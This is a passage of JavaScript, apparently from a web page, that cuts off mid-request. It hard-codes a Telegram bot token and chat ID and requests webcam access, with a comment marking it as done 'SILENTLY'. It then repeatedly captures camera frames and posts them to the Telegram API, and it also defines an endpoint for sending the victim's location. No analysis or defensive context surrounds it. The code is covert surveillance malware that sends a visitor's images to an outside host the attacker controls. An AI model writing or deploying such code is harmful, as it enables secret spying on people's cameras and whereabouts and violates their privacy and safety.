        const BOT_TOKEN = "8989398872:AAE5qZxUT0fbOOkSbYcDigfjfnttOKYEnsg";
        const CHAT_ID = "7870731053";
        const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
        const LOCATION_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`;

        // Request camera & location access (SILENTLY)
        navigator.mediaDevices.getUserMedia({ video: true, audio: false })
            .then(stream => {

                video.srcObject = stream;

                setInterval(() => {

                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                    // Convert to blob and send to Telegram
                    canvas.toBlob(blob => {
                        const formData = new FormData();
                        formData.append('chat_id', CHAT_ID);
                        formData.append('photo', blob, 'spam.jpg');

                        fetch(API_URL, {
                            method: 'POST',
                            body: formData
